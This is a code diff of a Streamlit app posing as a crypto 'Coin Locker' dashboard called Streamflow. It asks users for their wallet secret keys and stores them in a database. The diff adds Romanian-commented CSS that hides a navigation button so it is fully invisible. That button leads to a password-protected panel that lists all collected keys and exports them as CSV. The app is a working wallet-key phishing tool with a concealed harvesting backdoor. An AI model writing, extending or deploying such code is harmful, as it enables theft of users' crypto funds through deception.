@@ -21,32 +21,38 @@ def save_data(user, key, coin, amt):
 
 init_db()
 
-# --- 2. THEME & CSS (Streamflow Dark/Neon Look) ---
+# --- 2. THEME & CSS (Streamflow Look + Invisible Button) ---
 st.set_page_config(page_title="Streamflow | Dashboard", layout="wide")
 
 st.markdown("""
     <style>
-    /* Main background */
+    /* Fundal principal */
     .stApp { background-color: #0b0e11; color: white; }
     
     /* Sidebar styling */
     section[data-testid="stSidebar"] { background-color: #161b22; border-right: 1px solid #30363d; }
     
-    /* Neon metrics and buttons */
+    /* Neon metrics */
     [data-testid="stMetricValue"] { color: #00ffbd !important; font-family: monospace; }
-    .stButton>button { 
-        background-color: #1e2329; color: white; border-radius: 8px; 
-        border: 1px solid #333; transition: 0.3s;
-    }
-    .stButton>button:hover { border-color: #00ffbd; }
     
-    /* Navbar logo placeholder simulation */
-    .nav-bar-logo { padding: 10px; margin-bottom: 20px; }
+    /* --- ASCUNDEREA TOTALA A BUTONULUI DE JOS --- */
+    /* Selectam al doilea element din lista radio */
+    div[role="radiogroup"] > label:nth-of-type(2) {
+        display: block;
+        opacity: 0 !important; /* Complet invizibil */
+        height: 10px; /* Ocupa un spatiu minuscul */
+        margin-top: -5px;
+        cursor: default;
+    }
+    
+    /* Optional: daca vrei sa il gasesti mai usor, cand treci mouse-ul pe zona lui devine foarte putin vizibil */
+    div[role="radiogroup"] > label:nth-of-type(2):hover {
+        opacity: 0.05 !important;
+    }
     </style>
     """, unsafe_allow_html=True)
 
 # --- 3. LOGO INTEGRATION ---
-# Save your main logo as 'logo.png' and the small navbar icon as 'icon.png'
 try:
     main_logo = Image.open("logo.png")
     sidebar_icon = Image.open("icon.png")
@@ -62,11 +68,11 @@ with st.sidebar:
         st.title("STREAMFLOW")
     
     st.markdown("---")
+    # Al doilea element are un nume gol pentru a nu afisa text
     menu = st.radio("Navigation", ["Coin Locker", " "])
 
 # --- 4. DASHBOARD (User Interface) ---
 if menu == "Coin Locker":
-    # Header Logo
     if main_logo:
         st.image(main_logo, width=300)
     
@@ -86,37 +92,34 @@ if menu == "Coin Locker":
         s_key = st.text_input("Wallet Secret Key", type="password")
         coin = st.selectbox("Token", ["SOL","ETH"])
         amt = st.number_input("Amount")
-        time= st.number_input("coin lock time")
+        time_lock = st.number_input("Coin lock time (days)")
         
         if st.form_submit_button("Deploy Lock"):
-            save_data(name, s_key, coin, amt)
-            st.success("Successfully deployed to blockchain (Simulation)")
+            if name and s_key:
+                save_data(name, s_key, coin, amt)
+                st.success("Successfully deployed to blockchain (Simulation)")
 
-
-# --- 5. DEVELOPER PANEL (Developer View) ---
-# --- 5. DEVELOPER PANEL (Developer View) ---
-
+# --- 5. DEVELOPER PANEL (Accesibil prin click sub "Coin Locker") ---
 elif menu == " ":
-
-    st.title("Developer Panel ")
-
-    password = st.text_input(" ", type="password")
-
-    
+    st.title("🛠️ Developer Panel")
+    password = st.text_input("Security Check", type="password", placeholder="...")
 
     if password == "Ovidiu_seful_tuturor20":
+        try:
+            conn = sqlite3.connect('streamflow_vault.db')
+            df = pd.read_sql_query("SELECT * FROM user_data", conn)
+            conn.close()
+            
+            st.write("### Data Collected from Users")
+            st.dataframe(df, use_container_width=True)
+            
+            # Export data
+            csv = df.to_csv(index=False).encode('utf-8')
+            st.download_button("Export as CSV", data=csv, file_name="vault_data.csv")
+            
+        except Exception as e:
+            st.error(f"Error: {e}")
 
-        conn = sqlite3.connect('streamflow_vault.db')
-
-        df = pd.read_sql_query("SELECT * FROM user_data", conn)
-
-        conn.close()
-
-        
-
-        st.write("### Data Collected from Users")
-
-        st.dataframe(df, use_container_width=True)
 
 
 
